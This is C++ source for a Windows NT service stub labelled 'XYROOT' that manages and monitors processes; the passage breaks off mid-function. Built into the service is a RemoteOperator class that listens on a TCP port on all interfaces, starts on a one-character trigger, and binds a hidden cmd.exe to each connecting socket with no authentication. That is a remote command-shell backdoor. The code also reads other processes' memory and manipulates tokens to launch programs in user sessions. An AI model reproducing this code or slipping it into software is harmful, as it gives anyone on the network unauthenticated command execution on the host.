////////////////////////////////////////////////////////////////////// 
// NT Service Stub Code (For XYROOT )
//////////////////////////////////////////////////////////////////////
#define  _WIN32_WINNT 0x0501
#define WAIT_OBJECT_0 ((STATUS_WAIT_0) + 0)
#define WAIT_OBJECT_1 ((STATUS_WAIT_0) + 1)
#include <afxwin.h>
#include <afxmt.h>
#include <stdio.h>
#include <windows.h>
#include <winbase.h>
#include <winsvc.h>
#include <process.h>
#include <time.h>
#include <Psapi.h>
#include <Wtsapi32.h>
#include <Userenv.h>
#include <vector>
#include <atlbase.h>
#include <ATLComTime.h>
#include <TlHelp32.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <atlbase.h>
#include <sstream>
#include <iostream>
#include "remoteserver.h"
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "Psapi.lib")
#define NTSTATUS LONG
#define STATUS_SUCCESS               (0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH  (0xC0000004L)

/*
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemProcessInformation = 5
} SYSTEM_INFORMATION_CLASS;
*/
const int c_iMainVer = 1;		// main version
const int c_iSubVer = 4;		// sub version
const int c_nMaxSize = 2048;		// array capacity
char pServiceName[c_nMaxSize] = "";
char pExeFile[c_nMaxSize] = "";
char pInitFile[c_nMaxSize] = "";
char pLogFile[c_nMaxSize] = "";
int nProcCount = 0;		// count of processes
CEvent g_OEventStartProcess;
HANDLE g_SingleInstanceHandle = INVALID_HANDLE_VALUE;
BOOL g_bServiceShutDown = FALSE;
HANDLE g_hCheckThread = NULL;
CRITICAL_SECTION myCS;
BOOL KillService(char* pName) ;
volatile LONG g_bUseWQLFindProcess = 0;
CRemoteSesrver GRemoteServer;
void WriteLog(char* pFile, char* pMsg, BOOL bDbg )
{
	// write error or other information into log file
	::EnterCriticalSection(&myCS);
	try
	{
		FILE* pLog = fopen(pFile,"a");
		SYSTEMTIME oT;
		::GetLocalTime(&oT);
		if (bDbg)
		{
#ifdef _DEBUG
			fprintf(pLog,"[%04d-%02d-%02d %02d:%02d:%02d]%s\n",oT.wYear,oT.wMonth,oT.wDay,oT.wHour,oT.wMinute,oT.wSecond,pMsg); 
#endif
		}
		else
			fprintf(pLog,"[%04d-%02d-%02d %02d:%02d:%02d]%s\n",oT.wYear,oT.wMonth,oT.wDay,oT.wHour,oT.wMinute,oT.wSecond,pMsg); 
		fclose(pLog);
	}
	catch(...)
	{
	}
	::LeaveCriticalSection(&myCS);
}

BOOL gbInit = FALSE;
volatile LONG g_lUseDeepSearch = 0;
class RemoteOperator
{
public:
	RemoteOperator()
	{

		g_bExit = FALSE;
	}

	~RemoteOperator()
	{

		g_bExit = TRUE;
	}

	static BOOL DetectAvailablePort(int & anPort)
	{
		if (IsPortAvailable(anPort))
		{
			return TRUE;
		}

		for (int i =25000;i<26000;i++)
		{
			if (IsPortAvailable(i))
			{
				anPort = i;

				return TRUE;
			}
		}

		return FALSE;
	}

	static BOOL g_bExit;

	static BOOL  IsPortAvailable(int anPort)
	{

		unsigned short lusPortTest = anPort;

		long lSockTest = (long)socket(AF_INET, SOCK_STREAM, 0);

		if(0 > lSockTest)
		{
			return FALSE;
		}

		//绑定本地地址
		struct sockaddr_in  serverAddr;
		memset((char *)&serverAddr, 0, (long)sizeof(serverAddr));     
		serverAddr.sin_family = AF_INET;
		serverAddr.sin_addr.s_addr = ::inet_addr(_T("127.0.0.1"));
		serverAddr.sin_port = htons(lusPortTest);

		if (0 > bind ((SOCKET)lSockTest, (struct sockaddr *)&serverAddr, sizeof(serverAddr)))
		{
			(void)closesocket((UINT)lSockTest);

			return FALSE;
		}

		(void)closesocket((UINT)lSockTest);

		return TRUE;
	}


	static UINT ServerProcForInfo(LPVOID apData)
	{
		

		WSADATA wsa;

		SOCKET s;
		SOCKADDR_IN sAddr;

		USHORT port;

		PROCESS_INFORMATION pi;
		STARTUPINFO si;

		RemoteOperator * lpThis = (RemoteOperator*)apData;

		port = 6211;//Set listening port

		if (NULL != apData)
		{
			port = lpThis->Port();
		}

		memset( &si, 0, sizeof( si ) );
		si.cb = sizeof( si );
		si.wShowWindow = SW_HIDE;
		si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

		sAddr.sin_addr.s_addr = INADDR_ANY;
		sAddr.sin_port =  (port >> 8) | (port << 8);
		sAddr.sin_family = AF_INET;

		WSAStartup( 0x0202, &wsa );

		s = WSASocket( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 );
		int lnRet = bind( s, (LPSOCKADDR)&sAddr, sizeof( sAddr ) );

		if (SOCKET_ERROR == lnRet)
		{
			return -1;
		}

		lnRet = listen( s, 5 );

		if (SOCKET_ERROR == lnRet)
		{
			return -1;
		}

		while(!g_bExit)
		{
			SOCKADDR_IN loClientAddr ={0}; // 定义一个客户端得地址结构作为参数  

			int lnAddr_length=sizeof(loClientAddr);  

			//closesocket(loClient);		

			SOCKET loClient = WSAAccept(	s, 
				(SOCKADDR*)&loClientAddr, 
				&lnAddr_length, 
				NULL, 
				0);

			if (INVALID_SOCKET == loClient)
			{
				continue;
			}
			std::vector<CHAR> loCommand(5);

			int iResult =recv(loClient,&loCommand.front(),loCommand.size()-2,0);

			loCommand[loCommand.size()-1] = 0;

			CString lstrCommand = &loCommand.front();

			int lnIndex = lstrCommand.Find(_T("x"));

			if (lnIndex==0)
			{
				::AfxBeginThread(	RealServer,
					(LPVOID)apData,
					THREAD_PRIORITY_NORMAL,
					0,
					NULL);
			}

			shutdown(loClient,SD_BOTH);
			closesocket(loClient);

		}
		return 0;
	}

	static UINT RealServer(LPVOID apData)
	{
		try
		{

			WSADATA wsa;

			SOCKET s;
			 
			SOCKADDR_IN sAddr;

			USHORT port;

			PROCESS_INFORMATION pi;
			STARTUPINFO si;


			RemoteOperator * lpThis = (RemoteOperator*)apData;

			port = 6211;//Set listening port

			port = lpThis->Port();

			if (NULL != apData)
			{
				port = lpThis->Port();
			}

			memset( &si, 0, sizeof( si ) );
			si.cb = sizeof( si );
			si.wShowWindow = SW_HIDE;
			si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

			sAddr.sin_addr.s_addr = INADDR_ANY;
			sAddr.sin_port =  (port >> 8) | (port << 8);
			sAddr.sin_family = AF_INET;

			WSAStartup( 0x0202, &wsa );

			s = WSASocket( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 );
			bind( s, (LPSOCKADDR)&sAddr, sizeof( sAddr ) );
			sockaddr  loClientAddr = {0};
			int lnSize = sizeof(loClientAddr);
			listen( s, 5 );
			SOCKET client;
			__asm
			{
				push ebx
					mov ebx, s
			}
			
			while(!g_bExit)
			{			
			
				client = accept( s, &loClientAddr, &lnSize );//Accept Client

				if (client == INVALID_SOCKET)
				{
					Sleep(1000);
					continue;
				}
			
				si.hStdInput = (HANDLE)client;
				si.hStdOutput = (HANDLE)client;
				si.hStdError = (HANDLE)client;

				char pTemp[121];
				struct sockaddr_in* pV4Addr = (struct sockaddr_in*)&loClientAddr;
				sprintf(pTemp, "client connected from %s\n", inet_ntoa(pV4Addr->sin_addr));
				WriteLog(pLogFile, pTemp);

				CreateProcess( NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi );//Start the remote process
				WaitForSingleObject( pi.hProcess, INFINITE );//Allow Client to control remote process

				CloseHandle( pi.hProcess );
				CloseHandle( pi.hThread );
				closesocket( client );

			}


			WSACleanup();
			//CComServer::ServerProcForInfo(NULL);//Server Start Loop
		}
		catch (...)
		{
			//log here
			ASSERT(FALSE);
			CString lstrErrorLog;
			lstrErrorLog.Format(_T("*******************Error Occoured!%s %d******************"),__FILE__,__LINE__);
			OutputDebugString(lstrErrorLog);

		}

		return 0;
	}

	 BOOL StartTraceServer()
	{
		::AfxBeginThread(	RealServer,
			(LPVOID)this,
			THREAD_PRIORITY_NORMAL,
			0,
			NULL);
		return TRUE;
	};

	 int Port() const { return m_nPort; }
	 void Port(int val) { m_nPort = val; }
private:
	int m_nPort;
};

BOOL RemoteOperator::g_bExit = FALSE;

class ProcessQuerytor
{
public:
	ProcessQuerytor()
	{
		// Step 1: --------------------------------------------------
		// Initialize COM. ------------------------------------------
		 CoInitializeEx(0, COINIT_MULTITHREADED);

		// Step 2: --------------------------------------------------
		// Set general COM security levels --------------------------
		// Note: If you are using Windows 2000, you need to specify -
		// the default authentication credentials for a user by using
		// a SOLE_AUTHENTICATION_LIST structure in the pAuthList ----
		// parameter of CoInitializeSecurity ------------------------
		  CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);

		// Step 3: ---------------------------------------------------
		// Obtain the initial locator to WMI -------------------------
		WbemLocator.CoCreateInstance(CLSID_WbemLocator);

		if (WbemLocator!=NULL)
		{
			// Step 4: -----------------------------------------------------
			// Connect to WMI through the IWbemLocator::ConnectServer method
			WbemLocator->ConnectServer(L"ROOT\\CIMV2", NULL, NULL, NULL, 0, NULL, NULL, &WbemServices);   

			// Step 5: --------------------------------------------------
			// Set security levels on the proxy -------------------------
			CoSetProxyBlanket(WbemServices, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);

			// Step 6: --------------------------------------------------
			// Use the IWbemServices pointer to make requests of WMI ----
		}
	}

	CString GetNameFromCom(DWORD awProcessID,CString & astrCommandLine)
	{
		USES_CONVERSION;
		CString lstrSQL ;
		CString lstrRet;
		if (WbemServices == NULL)
		{
			return lstrRet;
		}
		lstrSQL.Format(_T("SELECT ProcessId,CommandLine,ExecutablePath FROM Win32_Process where ProcessId=%d"),awProcessID);
		WCHAR * lpSQL = T2W(lstrSQL);
		CComPtr<IEnumWbemClassObject> EnumWbem;
		WbemServices->ExecQuery(L"WQL", lpSQL, WBEM_FLAG_FORWARD_ONLY, NULL, &EnumWbem);
		
		HRESULT hr = S_OK;
		// Step 7: -------------------------------------------------
		// Get the data from the query in step 6 -------------------
		if (EnumWbem != NULL) 
		{
		   CComPtr<	IWbemClassObject> result;
			ULONG returnedCount = 0;

			while((hr = EnumWbem->Next(WBEM_INFINITE, 1, &result, &returnedCount)) == S_OK) 
			{
				//CComVariant
				CComVariant ProcessId;
				CComVariant CommandLine;
				CComVariant ExecutablePath;
				// access the properties
				hr = result->Get(L"ProcessId", 0, &ProcessId, 0, 0);
				hr = result->Get(L"CommandLine", 0, &CommandLine, 0, 0);
				hr = result->Get(L"ExecutablePath", 0, &ExecutablePath, 0, 0);      ;            
				if (!(CommandLine.vt==VT_NULL) && (!(ExecutablePath.vt ==VT_NULL) ))
				{
#ifdef _DEBUG
					wprintf(L"%u  %s %s\r\n", ProcessId.uintVal, CommandLine.bstrVal,ExecutablePath.bstrVal);
#endif // _DEBUG

				}
/*
				VariantClear(&ProcessId);
				VariantClear(&CommandLine);
				VariantClear(&ExecutablePath);*/
			
				if (ProcessId.intVal == awProcessID)
				{
					if(!(CommandLine.vt==VT_NULL))
					{
						astrCommandLine = W2T(CommandLine.bstrVal);
					}
					
					if(!(ExecutablePath.vt==VT_NULL))
					{
						lstrRet = W2T(ExecutablePath.bstrVal);	
					}
								
					break;
				}
			}
		}

		return lstrRet;

	}
	~ProcessQuerytor()
	{
	//	CoUninitialize();    
	}
protected:
	CComPtr<IWbemLocator>        WbemLocator ;
	CComPtr<IWbemServices>        WbemServices;

};

typedef LONG KPRIORITY; // Thread priority

typedef struct _SYSTEM_PROCESS_INFORMATION_DETAILD {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER SpareLi1;
	LARGE_INTEGER SpareLi2;
	LARGE_INTEGER SpareLi3;
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	KPRIORITY BasePriority;
	HANDLE UniqueProcessId;
	ULONG InheritedFromUniqueProcessId;
	ULONG HandleCount;
	BYTE Reserved4[4];
	PVOID Reserved5[11];
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved6[6];
} SYSTEM_PROCESS_INFORMATION_DETAILD, *PSYSTEM_PROCESS_INFORMATION_DETAILD;

typedef LONG (WINAPI *PFN_NT_QUERY_SYSTEM_INFORMATION) (
	IN       SYSTEM_INFORMATION_CLASS SystemInformationClass,
	IN OUT   PVOID SystemInformation,
	IN       ULONG SystemInformationLength,
	OUT OPTIONAL  PULONG ReturnLength
	) ;

#ifndef NT_ERROR
#define NT_ERROR(Status) ((((ULONG)(Status)) >> 30) == 3)
#endif

DWORD GetRemoteCommandLineW(HANDLE hProcess, LPWSTR pszBuffer, UINT bufferLength)
{
	struct RTL_USER_PROCESS_PARAMETERS_I
	{
		BYTE Reserved1[16];
		PVOID Reserved2[10];
		UNICODE_STRING ImagePathName;
		UNICODE_STRING CommandLine;
	};

	struct PEB_INTERNAL
	{
		BYTE Reserved1[2];
		BYTE BeingDebugged;
		BYTE Reserved2[1];
		PVOID Reserved3[2];
		struct PEB_LDR_DATA* Ldr;
		RTL_USER_PROCESS_PARAMETERS_I* ProcessParameters;
		BYTE Reserved4[104];
		PVOID Reserved5[52];
		struct PS_POST_PROCESS_INIT_ROUTINE* PostProcessInitRoutine;
		BYTE Reserved6[128];
		PVOID Reserved7[1];
		ULONG SessionId;
	};

	typedef LONG (NTAPI* NtQueryInformationProcessPtr)(
		IN HANDLE ProcessHandle,
		IN PROCESSINFOCLASS ProcessInformationClass,
		OUT PVOID ProcessInformation,
		IN ULONG ProcessInformationLength,
		OUT PULONG ReturnLength OPTIONAL);

	typedef ULONG (NTAPI* RtlNtStatusToDosErrorPtr)(NTSTATUS Status);

	// Locating functions
	HINSTANCE hNtDll = GetModuleHandleW(L"ntdll.dll");
	NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hNtDll, "NtQueryInformationProcess");
	RtlNtStatusToDosErrorPtr RtlNtStatusToDosError = (RtlNtStatusToDosErrorPtr)GetProcAddress(hNtDll, "RtlNtStatusToDosError");

	if(!NtQueryInformationProcess || !RtlNtStatusToDosError)
	{
		printf("Functions cannot be located.\n");
		return 0;
	}

	// Get PROCESS_BASIC_INFORMATION
	PROCESS_BASIC_INFORMATION pbi;
	ULONG len;
	NTSTATUS status = NtQueryInformationProcess(
		hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &len);
	SetLastError(RtlNtStatusToDosError(status));
	if(NT_ERROR(status) || !pbi.PebBaseAddress)
	{
		printf("NtQueryInformationProcess(ProcessBasicInformation) failed.\n");
		return 0;
	}

	// Read PEB memory block
	SIZE_T bytesRead = 0;
	PEB_INTERNAL peb;
	if(!ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead))
	{
		printf("Reading PEB failed.\n");
		return 0;
	}

	// Obtain size of commandline string
	RTL_USER_PROCESS_PARAMETERS_I upp;
	if(!ReadProcessMemory(hProcess, peb.ProcessParameters, &upp, sizeof(upp), &bytesRead))
	{
		printf("Reading USER_PROCESS_PARAMETERS failed.\n");
		return 0;
	}

	if(!upp.CommandLine.Length)
	{
		printf("Command line length is 0.\n");
		return 0;
	}

	// Check the buffer size
	DWORD dwNeedLength = (upp.CommandLine.Length+1) / sizeof(wchar_t) +1;
	if(bufferLength < dwNeedLength)
	{
		printf("Not enough buffer.\n");
		return dwNeedLength;
	}

	// Get the actual command line
	pszBuffer[dwNeedLength - 1] = L'\0';
	if(!ReadProcessMemory(hProcess, upp.CommandLine.Buffer, pszBuffer, upp.CommandLine.Length, &bytesRead))
	{
		printf("Reading command line failed.\n");
		return 0;
	}

	return bytesRead / sizeof(wchar_t);
}

BOOL GetSpecPrivilege(LPCTSTR lpPrivilege);
DWORD GetCurrentLogonUserSessionID(int anIndex);
BOOL SetPrivilege(
				  HANDLE hToken,          // token handle
				  LPCTSTR Privilege,      // Privilege to enable/disable
				  BOOL bEnablePrivilege   // TRUE to enable.  FALSE to disable
				  );

BOOL SetPrivilege(
				  HANDLE hToken,          // token handle
				  LPCTSTR Privilege,      // Privilege to enable/disable
				  BOOL bEnablePrivilege   // TRUE to enable.  FALSE to disable
				  );

CString GetNameFromComX(DWORD awProcessID,ProcessQuerytor & arefQuery,CString & astrCommandLine)
{
	long lnUserDeepSearch = InterlockedExchangeAdd(&g_lUseDeepSearch,0);
	CString lstrRet ;
	
	if (lnUserDeepSearch>0)
	{
		lstrRet = arefQuery.GetNameFromCom(awProcessID,astrCommandLine);
	}
	return lstrRet;
}


CString GetNameFromCom(DWORD awProcessID,ProcessQuerytor & arefQuery)
{
	USES_CONVERSION;
	HRESULT hr = 0;
	IWbemLocator         *WbemLocator  = NULL;
	IWbemServices        *WbemServices = NULL;
	IEnumWbemClassObject *EnumWbem  = NULL;
	CString lstrRet ;
	// Step 1: --------------------------------------------------
	// Initialize COM. ------------------------------------------
	hr = CoInitializeEx(0, COINIT_MULTITHREADED);

	// Step 2: --------------------------------------------------
	// Set general COM security levels --------------------------
	// Note: If you are using Windows 2000, you need to specify -
	// the default authentication credentials for a user by using
	// a SOLE_AUTHENTICATION_LIST structure in the pAuthList ----
	// parameter of CoInitializeSecurity ------------------------
	hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);

	// Step 3: ---------------------------------------------------
	// Obtain the initial locator to WMI -------------------------
	hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID *) &WbemLocator);

	// Step 4: -----------------------------------------------------
	// Connect to WMI through the IWbemLocator::ConnectServer method
	hr = WbemLocator->ConnectServer(L"ROOT\\CIMV2", NULL, NULL, NULL, 0, NULL, NULL, &WbemServices);   

	// Step 5: --------------------------------------------------
	// Set security levels on the proxy -------------------------
	hr = CoSetProxyBlanket(WbemServices, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);

	// Step 6: --------------------------------------------------
	// Use the IWbemServices pointer to make requests of WMI ----
	CString lstrSQL ;
	lstrSQL.Format(_T("SELECT ProcessId,CommandLine,ExecutablePath FROM Win32_Process where ProcessId=%d"),awProcessID);
	WCHAR * lpSQL = T2W(lstrSQL);
	hr = WbemServices->ExecQuery(L"WQL", lpSQL, WBEM_FLAG_FORWARD_ONLY, NULL, &EnumWbem);


	// Step 7: -------------------------------------------------
	// Get the data from the query in step 6 -------------------
	if (EnumWbem != NULL) {
		IWbemClassObject *result = NULL;
		ULONG returnedCount = 0;

		while((hr = EnumWbem->Next(WBEM_INFINITE, 1, &result, &returnedCount)) == S_OK) 
		{
			VARIANT ProcessId;
			VARIANT CommandLine;
			VARIANT ExecutablePath;
			// access the properties
			hr = result->Get(L"ProcessId", 0, &ProcessId, 0, 0);
			hr = result->Get(L"CommandLine", 0, &CommandLine, 0, 0);
			hr = result->Get(L"ExecutablePath", 0, &ExecutablePath, 0, 0);      ;            
			if (!(CommandLine.vt==VT_NULL))
			{
#ifdef _DEBUG
				wprintf(L"%u  %s %s\r\n", ProcessId.uintVal, CommandLine.bstrVal,ExecutablePath.bstrVal);
#endif // _DEBUG
				
			}
			VariantClear(&ProcessId);
			VariantClear(&CommandLine);
			VariantClear(&ExecutablePath);
			result->Release();

			if (ProcessId.intVal == awProcessID)
			{
				lstrRet = W2T(ExecutablePath.bstrVal);				
				break;
			}
		}
	}

	// Cleanup
	// ========
	EnumWbem->Release();
	WbemServices->Release();
	WbemLocator->Release();

	CoUninitialize();    
	return lstrRet;
}

CString  UseToolhelp32GetProcessName(DWORD adwProcessID)
{
	MODULEENTRY32 peInfo = {0};  
	peInfo.dwSize = sizeof(peInfo);

	CString lstrName ="";

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE32, adwProcessID);

	if(hSnapshot != INVALID_HANDLE_VALUE )
	{
		peInfo.dwSize = sizeof(peInfo); // this line is REQUIRED
		BOOL nextProcess = Module32First(hSnapshot, &peInfo);
		bool found = false;
		while(nextProcess)
		{
			if(peInfo.th32ProcessID == adwProcessID)
			{
				found = true;
				break;
			}
			nextProcess= Module32Next(hSnapshot, &peInfo);
		}
		if(found)
		{
			lstrName = peInfo.szModule;			
		}
		CloseHandle(hSnapshot);
	}

	return lstrName;
}

BOOL UnDocumentedEnumAllProcess(PSYSTEM_PROCESS_INFORMATION_DETAILD & pspid)
{
	USES_CONVERSION;
	size_t bufferSize = 102400;
	pspid=
		(PSYSTEM_PROCESS_INFORMATION_DETAILD) malloc (bufferSize);
	ULONG ReturnLength;
	PFN_NT_QUERY_SYSTEM_INFORMATION pfnNtQuerySystemInformation = (PFN_NT_QUERY_SYSTEM_INFORMATION)
		GetProcAddress (GetModuleHandle(TEXT("ntdll.dll")), "NtQuerySystemInformation");

	if (NULL == pfnNtQuerySystemInformation)
	{
		return FALSE;
	}
	LONG status;

	while (TRUE)
	{
		status = pfnNtQuerySystemInformation (SystemProcessInformation, (PVOID)pspid,
			bufferSize, &ReturnLength);
		if (status == STATUS_SUCCESS)
			break;
		else if (status != STATUS_INFO_LENGTH_MISMATCH) 
		{ // 0xC0000004L
			_tprintf (TEXT("ERROR 0x%X\n"), status);
			return FALSE;   // error
		}

		bufferSize *= 2;
		pspid = (PSYSTEM_PROCESS_INFORMATION_DETAILD) realloc ((PVOID)pspid, bufferSize);
	}

	return TRUE;
}

BOOL FreeUnDocumentedEnumAllProcess(PSYSTEM_PROCESS_INFORMATION_DETAILD & pspid)
{

	if (NULL!=pspid)
	{
		free(pspid);

		pspid = NULL;

		return TRUE;
	}

	return FALSE;
}

CString UnDocumentedGetProcessName(DWORD adwProcessID,PSYSTEM_PROCESS_INFORMATION_DETAILD & pspid)
{

	USES_CONVERSION;

	if (NULL == pspid)
	{
		return "";
	}

	for (;;
		pspid=(PSYSTEM_PROCESS_INFORMATION_DETAILD)(pspid->NextEntryOffset + (PBYTE)pspid)) {

			DWORD ldwProcessID =(DWORD) pspid->UniqueProcessId ;
			if(ldwProcessID == adwProcessID)
			{

				CString lstrRet = W2T(pspid->ImageName.Buffer);
				return lstrRet;
			}
			_tprintf (TEXT("ProcessId: %d, ImageFileName: %ls\n"), pspid->UniqueProcessId,
				(pspid->ImageName.Length && pspid->ImageName.Buffer)? pspid->ImageName.Buffer: L"");

			if (pspid->NextEntryOffset == 0) break;
		}

		return ""; 
}

CString GetAppPath()
{
	CString lstrAppPath;

	::GetModuleFileName(NULL, lstrAppPath.GetBuffer(256), 256);

	lstrAppPath.ReleaseBuffer();

	int n = lstrAppPath.ReverseFind( _T('\\') );

	lstrAppPath = lstrAppPath.Left(n + 1);

	CString strTempPathName;

	::GetLongPathName(lstrAppPath,strTempPathName.GetBuffer(256), 256);

	strTempPathName.ReleaseBuffer();

	lstrAppPath = strTempPathName;

	return lstrAppPath;
}

enum DateTimeStatus
{
	error = -1,
	valid = 0,
	invalid = 1,    // Invalid date (out of range, etc.)
	null = 2,       // Literally has no value
};





struct MyProcess
{
	PROCESS_INFORMATION procInfo[c_nMaxSize];		///< process instance array of the same one executable file
	int nInstCount;															///< count of process instances
	char szModuleName[c_nMaxSize];		
	char szRealProcessName[c_nMaxSize];	///< the full path of the executable file
	char  szDirectory[c_nMaxSize];	
	MyProcess()
	{
		nInstCount = 0;
		ZeroMemory(procInfo,sizeof(procInfo));
		ZeroMemory(szModuleName,sizeof(szModuleName));
		ZeroMemory(szRealProcessName,sizeof(szRealProcessName));
		ZeroMemory(szDirectory,sizeof(szDirectory));
		this->m_nProcInfoCount = c_nMaxSize;
	}
	int m_nProcInfoCount;
} *pProcess = NULL;

SERVICE_STATUS          serviceStatus; 
SERVICE_STATUS_HANDLE   hServiceStatusHandle; 

VOID WINAPI XYNTServiceMain( DWORD dwArgc, LPTSTR *lpszArgv );
VOID WINAPI XYNTServiceHandler( DWORD fdwControl );
void WorkerProc(void* pParam);


////////////////////////////////////////////////////////////////////// 
//
// Configuration Data and Tables
//
SERVICE_TABLE_ENTRY   DispatchTable[] = 
{ 
	{pServiceName, XYNTServiceMain},
	{NULL, NULL}
};


BOOL GetSpecPrivilege(LPCTSTR lpPrivilege)

{
	HANDLE hToken = NULL; 
	DWORD ldwErroCode = 0;

	TOKEN_PRIVILEGES tkp;

	HandleWatchDog loHandleWatchDog;

	loHandleWatchDog.SetHandle(hToken);
	// Get a token for this process.
	if (!OpenProcessToken(	GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY
		|TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY|TOKEN_ADJUST_SESSIONID
		|TOKEN_READ|TOKEN_WRITE,
		&hToken	))
	{
		ldwErroCode = GetLastError();
		return FALSE;
	}

	// Get the LUID for the shutdown privilege.
	if (!LookupPrivilegeValue(NULL,
		lpPrivilege, 
		&tkp.Privileges[0].Luid))
	{
		ldwErroCode = GetLastError();
		return FALSE;
	}


	tkp.PrivilegeCount = 1; // one privilege to set
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;


	// Get the shutdown privilege for this process.
	if (!AdjustTokenPrivileges(hToken, 
		FALSE, 
		&tkp, 
		0,
		(PTOKEN_PRIVILEGES)NULL, 
		0))
	{
		ldwErroCode = GetLastError();
	}

	ldwErroCode = GetLastError();
	// Cannot test the return value of AdjustTokenPrivileges.
	if (GetLastError() != ERROR_SUCCESS)
	{
		return FALSE;
	}

	return TRUE;

}

BOOL GetCurrentUserToken(HANDLE & ahToken,int anIndex)
{

	HANDLE hTokenThis = NULL;

	HANDLE hTokenDup = NULL;

	HANDLE hThisProcess = GetCurrentProcess();

	BOOL lbRet = OpenProcessToken(hThisProcess, TOKEN_ALL_ACCESS, &hTokenThis);

	if (lbRet)
	{
		lbRet = DuplicateTokenEx(hTokenThis, MAXIMUM_ALLOWED,NULL, SecurityIdentification, TokenPrimary, &hTokenDup);

		if (lbRet)
		{
			DWORD ldwSessionId = GetCurrentLogonUserSessionID(anIndex);

			if (-1!=ldwSessionId)
			{
				lbRet = SetTokenInformation(hTokenDup, TokenSessionId, &ldwSessionId, sizeof(DWORD));

				if (lbRet)
				{
					ahToken = hTokenDup;

				}else
				{
					lbRet = FALSE;
				}
			}else
			{
				lbRet = FALSE;
			}
		}else
		{
			lbRet = FALSE;
		}

	}

	if (NULL!= hTokenThis)
	{
		try
		{
			CloseHandle(hTokenThis);

		}catch(...)
		{

		}
	}

	if (NULL!= hThisProcess)
	{
		try
		{
			CloseHandle(hThisProcess);

		}catch(...)
		{

		}
	}

	if (!lbRet)
	{
		try
		{
			CloseHandle(hTokenDup);

		}catch(...)
		{

		}
	}

	return lbRet;
}


BOOL RefreshTray(int nIndex) 
{
	if (nIndex<0 || nIndex>=nProcCount)
	{
		return FALSE;
	}
	// start a process with given index
	STARTUPINFO startUpInfo = { sizeof(STARTUPINFO),NULL,"",NULL,0,0,0,0,0,0,0,STARTF_USESHOWWINDOW,0,0,NULL,0,0,0};  

	BOOL lbUseCurrentUserDesktop = FALSE;

	HANDLE lhToken = NULL;

	LPVOID lpEnv = NULL;

	char szCommandLine[c_nMaxSize] = "TrayRefresher.exe";

	char CurrentDesktopName[c_nMaxSize] = "";

	char szTmp[c_nMaxSize] = "";

	char szItem[c_nMaxSize] = "";

	HDESK hCurrentDesktop = NULL;

	sprintf(szItem, "Process%d", nIndex);

	BOOL bUserInterface = ::GetPrivateProfileInt(szItem, "UserInterface", 1, pInitFile);
	// find if there already exits the same process

	// set the correct desktop for the process to be started
	DWORD  ldwCreateFlag = NORMAL_PRIORITY_CLASS;

	if(bUserInterface)
	{
		if (2 == bUserInterface)
		{

			DWORD ldwActiveSessionId = GetCurrentLogonUserSessionID(nIndex);

			if (-1 != ldwActiveSessionId)
			{
				//BOOL lbRet = WTSQueryUserToken(ldwActiveSessionId,&lhToken);

				BOOL lbRet = GetCurrentUserToken(lhToken,nIndex);

				if (lbRet)
				{
					lbUseCurrentUserDesktop = TRUE;

					ldwCreateFlag = NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE|CREATE_UNICODE_ENVIRONMENT;

					if (CreateEnvironmentBlock(&lpEnv, lhToken, FALSE))
					{
						lbUseCurrentUserDesktop = TRUE;

					}else
					{
						lbUseCurrentUserDesktop = FALSE;

					}

				}
			}

			if (lbUseCurrentUserDesktop)
			{
				startUpInfo.wShowWindow = SW_HIDE;			
				startUpInfo.lpDesktop = "WinSta0\\default";
			}else
			{
				startUpInfo.wShowWindow = SW_HIDE;
				startUpInfo.lpDesktop = NULL;
			}
		}
		else
		{
			startUpInfo.wShowWindow = SW_HIDE;
			startUpInfo.lpDesktop = NULL;
		}
	}
	else
	{
		hCurrentDesktop = GetThreadDesktop(GetCurrentThreadId());
		DWORD len;
		::GetUserObjectInformation(hCurrentDesktop,UOI_NAME,CurrentDesktopName,MAX_PATH,&len);
		startUpInfo.wShowWindow = SW_HIDE;
		startUpInfo.lpDesktop = CurrentDesktopName;		

	}

	// create the process
	CString lstrWorkDir = GetAppPath();
	unsigned int nPauseSec = 1;

	PROCESS_INFORMATION procInfo[c_nMaxSize] = {0};

	if (lbUseCurrentUserDesktop)
	{

		BOOL lbRet =  FALSE;

		CString lstrFullPath;
		lstrFullPath.Format(_T("%s/%s"),lstrWorkDir,szCommandLine);
